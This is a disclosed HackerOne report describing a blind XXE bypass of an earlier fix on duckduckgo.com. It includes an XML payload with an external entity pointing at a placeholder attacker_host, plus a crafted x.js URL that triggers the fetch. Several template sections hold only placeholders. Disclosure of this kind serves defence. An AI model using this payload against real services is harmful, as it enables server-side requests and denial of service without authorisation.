# Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

## Metadata
- **Source:** HackerOne
- **Report:** 486732 | https://hackerone.com/reports/486732
- **Submitted:** 2019-01-26
- **Reporter:** mik317
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** XML External Entities (XXE)
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the following content:

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```
2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml
3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}

I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.

## Impact

Blind XXE leads to `dos` and `blind injection`.

</details>

---
*Analysed by Claude on 2026-05-24*
